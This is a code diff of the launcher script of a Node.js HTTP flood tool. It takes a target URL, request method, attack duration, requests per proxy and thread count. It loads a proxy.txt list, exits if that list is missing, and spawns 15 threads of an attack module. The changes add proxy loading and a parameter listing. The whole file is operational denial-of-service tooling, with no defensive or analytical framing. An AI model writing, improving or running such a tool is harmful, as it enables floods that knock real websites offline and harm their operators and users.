@@ -1,10 +1,13 @@
 const fs = require('fs')
-const { Command } = require('commander')
+const {
+    Command
+} = require('commander')
 
 const log = require('./modules/logger')
 const thread = require('./modules/threads')
 
 var temp = `${__dirname}\\temp.json`
+var proxy = `${__dirname}\\proxy.txt`
 
 log.banner()
 
@@ -17,22 +20,33 @@ program.option('-m, --method <GET, POST>', 'attack method')
 program.option('-t, --time <length>', 'attack time')
 program.option('-r, --reqs <length>', 'req per proxy connection')
 program.option('-th, --threads <length>', 'threads per attack')
+program.option('-p, --parameters', 'list all parameters')
 
 program.parse(process.argv)
 
-if (!program.url || !program.method || !program.time || !program.reqs || !program.threads) 
-    return log.error('you lacked to define something!')
+if (program.parameters)
+    return log.args()
+
+if (!program.url || !program.method || !program.time || !program.reqs || !program.threads)
+    return log.error('you lacked to define something, put -p or --parameters')
+
+if (fs.existsSync(proxy)) {
+    var proxies = fs.readFileSync(proxy, 'utf-8').match(/\S+/g)
+    if (!proxies)
+        return log.warn('u need proxies from make an attack!')
+    else
+        log.info(`loaded ${proxies.length} proxies.`)
+} else
+    return log.info('aborted, u need an proxy.txt')
 
 if (fs.existsSync(temp))
     fs.unlinkSync(temp)
 
-fs.writeFile(temp, `{ "proxies": "proxy.txt", "method": "${program.method}", "url" : "${program.url}", "time": ${program.time}, "reqpproxy": ${program.reqs} }`, function (err) 
-{
+fs.writeFile(temp, `{ "proxies": "proxy.txt", "method": "${program.method}", "url" : "${program.url}", "time": ${program.time}, "reqpproxy": ${program.reqs} }`, function (err) {
     if (err)
         return log.error('error on create temp.json.')
 
-    for (var i = 0; i < 15; i++) 
-    {
+    for (var i = 0; i < 15; i++) {
         thread.CreateThread(`${__dirname}\\modules\\attack.js`)
     }
 
